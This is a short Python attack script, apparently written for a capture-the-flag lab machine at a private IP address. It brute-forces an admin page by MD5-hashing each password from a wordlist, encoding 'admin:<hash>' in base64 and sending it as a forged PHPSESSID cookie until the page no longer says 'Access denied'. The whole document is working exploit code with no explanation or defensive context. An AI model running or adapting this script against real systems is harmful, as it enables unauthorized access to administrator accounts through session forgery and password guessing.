import requests
import hashlib
import base64



with open("passwords.txt", 'r') as file:
    passwords = file.read().splitlines()

for password in passwords:
    hashed_password = hashlib.md5(password.encode()).hexdigest()
    payload = f"admin:{hashed_password}"
    base64_final = base64.b64encode(payload.encode()).decode()
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://10.10.68.97',
        'Referer': 'http://10.10.68.97/administration.php',
        'Cookie': f'PHPSESSID={base64_final}',
        'Upgrade-Insecure-Requests': '1'
        }

    fail = "Access denied"

    response = requests.get("http://10.10.68.97/administration.php", headers=headers)
    if fail in response.text:
        print(f"Trying: {base64_final}")
        print(response.text)
    else:
        print(f"Let's go {base64_final}")
        exit(1)

print("Sorry man :(")
